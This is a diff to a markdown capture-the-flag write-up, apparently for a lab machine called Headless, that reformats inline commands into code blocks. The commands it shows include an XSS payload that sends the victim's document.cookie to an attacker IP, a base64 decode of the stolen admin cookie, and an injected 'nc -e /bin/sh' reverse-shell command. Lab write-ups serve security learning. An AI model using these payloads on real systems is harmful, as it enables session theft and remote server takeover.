@@ -36,7 +36,10 @@ Also notice that we get the admin cookie in the cookie header of the response. I
 
 #### Directory Enumeration
 
-`dirsearch -u http://10.10.11.8:5000`
+```
+dirsearch -u http://10.10.11.8:5000
+```
+
 ![](../../assets/images/headless/dir.png)
 We have an extra directory /dashboard.
 
@@ -61,13 +64,20 @@ sudo php - S 0.0.0.0: 8000
 
 I tried different payloads, until this worked:
 
-`<script>var i=new Image(); i.src="http://10.10.16.63/?cookie="+btoa(document.cookie);</script>`
+```
+<script>var i=new Image(); i.src="http://10.10.16.63/?cookie="+btoa(document.cookie);</script>
+```
 
-Here we have used btoa() method for converting the cookie string into base64 encoded string![](/src/assets/images/headless/burp1.png)![](/src/assets/images/headless/res.png)![](/src/assets/images/headless/res2.png)
+Here we have used btoa() method for converting the cookie string into base64 encoded string
+![](../../assets/images/headless/burp1.png)
+![](../../assets/images/headless/res.png)
+![](../../assets/images/headless/res2.png)
 
 Decode cookie:
 
-`echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d`
+```
+echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d
+```
 
 ![](../../assets/images/headless/cookie1.png)
 
@@ -79,7 +89,9 @@ Pass the request of the /dashboard page to burp
 
 ![](../../assets/images/headless/burp.png)We can insert a payload within the date label to get shell.Using pyaload
 
-`nc+-e+/bin/sh+10.10.16.63+1234`
+```
+nc+-e+/bin/sh+10.10.16.63+1234
+```
 
 ![](../../assets/images/headless/payload.png)
 
